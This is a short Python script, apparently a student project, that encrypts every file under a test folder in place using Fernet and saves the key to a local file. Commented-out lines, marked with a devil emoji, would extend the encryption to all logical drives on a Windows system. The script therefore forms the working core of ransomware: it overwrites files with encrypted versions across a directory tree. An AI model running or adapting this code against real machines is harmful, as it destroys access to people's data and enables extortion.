# working
import os
import win32api
from cryptography import fernet
import ctypes
import shutil
import datetime

time1 = datetime.datetime.now()

# key generation
key = fernet.Fernet.generate_key()

# making a Ferner object
fer = fernet.Fernet(key)

# writing the key into file to decrypt files
os.chdir("D:\BE\SEM 3\Python_indi")
with open('key.key','wb') as f1:
    f1.write(key)
 
# uncomment below three line to encrypt each and every file in system 😈
# drives = win32api.GetLogicalDriveStrings()
# drives = drives.split('\000')[:-1]

# for k in drives:
for i in os.walk("D:\BE\SEM 3\Python_indi\\test"):
    for j in i[2]:
        file_path = os.path.join(i[0], j)
        s = ""
        try:
            with open(file_path, 'rb') as f:
                s = f.read()
            s = fer.encrypt(s)
            with open(file_path,'wb') as f1:
                f1.write(s)
            print(f'{j} encrypted')
        except Exception as e:
            print()
            print(f"Error reading {file_path}: {e}")
            print()

time2 = datetime.datetime.now()
print("Time Taken to encrypt all files",(time2-time1).total_seconds())